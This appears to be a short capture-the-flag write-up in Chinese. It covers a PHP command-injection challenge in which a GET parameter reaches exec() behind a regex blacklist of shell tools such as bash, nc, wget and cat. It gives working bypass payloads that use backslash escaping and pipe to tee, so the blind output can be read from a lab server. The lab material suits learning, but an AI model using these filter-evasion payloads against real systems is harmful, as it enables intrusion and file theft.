#RCE

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['url']))   {    
	$url=$_GET['url'];
	if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|
		echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))       {           echo "Sorry,you can't use this.";       
	}       else       {           
		echo "Can you see anything?";        
		exec($url);       
	}
}
```

无回显

```text
Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。

tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。
```

`l\s`可以代替 ls, | 是执行以下命令的意思

```shell
?url=l\s / | tee 1.txt
http://1.14.71.254:28023/1.txt
```

查看写入的文件

```sh
?url=tac /flllll\aaaaaaggggggg | tee 2.txt
http://1.14.71.254:28023/2.txt
```
